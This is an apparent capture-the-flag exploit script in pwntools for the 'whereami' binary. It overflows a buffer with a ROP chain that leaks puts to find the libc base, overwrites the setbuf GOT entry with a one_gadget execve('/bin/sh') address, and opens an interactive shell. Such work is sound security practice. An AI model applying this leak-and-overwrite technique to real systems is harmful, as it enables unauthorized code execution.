from pwn import *
elf_file = FILENAME = './whereami'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


#whereami
HOST = 'challs.actf.co'
POST = 31222
libc = ELF("./libc.so.6")
'''
HOST = 'localhost'
POST = 7777
libc = ELF("./libc.so.6")
'''
if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  cmd = """
    b main
    c
    """
  c = gdb.debug(FILENAME,cmd)
ret  = 0x00401144
prdi = 0x401303
prbp = 0x004011dd
puts_got = 0x404018
puts_plt = 0x4010a0
gets_plt = 0x4010e0
setbuf_got = 0x404028

payload = 'A'*72   
payload += p64(ret)
payload += p64(prdi)  
payload += p64(puts_got)#rdi:puts_got
payload += p64(puts_plt)#puts(put_got)
payload += p64(prdi)
payload += p64(setbuf_got)
payload += p64(gets_plt)
payload += p64(0x4011f6)
c.sendline(payload)
c.recvline()
c.recvline()
leak_puts = u64(c.recv(6) + '\x00\x00')
libc.address = a = leak_puts - libc.sym['puts']
print(hex(a))

'''
0xe3b2e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b31 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b34 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL


'''
c.sendline(p64(a + 0xe3b31))


c.interactive()